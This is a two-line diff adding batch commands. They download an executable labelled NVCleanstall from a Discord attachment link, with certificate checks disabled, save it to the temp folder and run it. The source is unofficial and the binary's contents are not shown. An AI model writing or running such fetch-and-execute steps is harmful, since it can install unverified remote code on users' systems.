@@ -1,0 +1,2 @@
+curl -g -k -L -# -o "%temp%\NVCleanstall_1.16.0_2.exe" "https://cdn.discordapp.com/attachments/1129168931081428992/1169201730358091816/NVCleanstall_1.16.0_2.exe?ex=65548af7&is=654215f7&hm=6ef1af021463a4bde0a84df6837c59953e147ad3a1534a3290029420620fd6c0&"
+start "%temp%\NVCleanstall_1.16.0_2.exe"
